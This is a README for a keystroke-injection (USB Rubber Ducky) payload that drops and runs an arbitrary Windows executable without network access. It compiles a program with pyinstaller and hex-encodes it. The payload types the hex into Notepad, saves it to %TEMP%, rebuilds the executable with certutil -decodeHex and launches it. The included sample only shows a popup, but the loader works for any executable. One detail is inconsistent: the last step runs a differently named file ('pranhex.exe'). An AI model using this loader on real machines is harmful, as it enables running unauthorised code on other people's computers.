# Example

Executables have been removed for security reasons.

## File list

- Python code: `example.py`
- Convert to hex script: `convert_to_hex.py`
- Executable file compiled using pyinstaller: `dist/example.exe`
- Hexadecimal code output: `example.hex`
- File compiled from hex code using certutil: `example.exe`

## Procedure

- This Python code create a Windows popup.

```python
import ctypes

ctypes.windll.user32.MessageBoxW(None, "Hello Hak5!", 'Info', 0x10 | 0x1)
```

- Create the executable

```powershell
pyinstaller --onefile C:/Users/Aleff/Documents/Install_And_Run_Any_Arbitrary_Executable-No_Internet_Needed/assets/example.py
```

- Create the hex code

```python
import binascii

def convert_to_hex(filename, output_file):
    with open(filename, 'rb') as file:
        binary_data = file.read()

    hex_code = binascii.hexlify(binary_data).decode()

    with open(output_file, 'w') as output:
        output.write(hex_code)

# Esempio di utilizzo
exe_filename = 'C:/Users/Aleff/Documents/Install_And_Run_Any_Arbitrary_Executable-No_Internet_Needed/assets/dist/example.exe'
output_filename = 'C:/Users/Aleff/Documents/Install_And_Run_Any_Arbitrary_Executable-No_Internet_Needed/assets/example.hex'
convert_to_hex(exe_filename, output_filename)
```

- Create the DuckyScript payload

```duckyscript
GUI r
DELAY 1000
STRINGLN notepad.exe
DELAY 2000
STRING #HEX_CODE
DELAY 2000
ALT F
DELAY 1000
STRING S
DELAY 1000
STRINGLN "%TEMP%\example.hex"
DELAY 1000
ENTER
DELAY 1000
ALT F4
DELAY 2000
GUI r
DELAY 500
STRINGLN certutil -f -decodeHex "%TEMP%\example.hex" "%TEMP%\example.exe"
DELAY 1000
ENTER
DELAY 1000
GUI r
DELAY 250
STRINGLN "%TEMP%\pranhex.exe"
```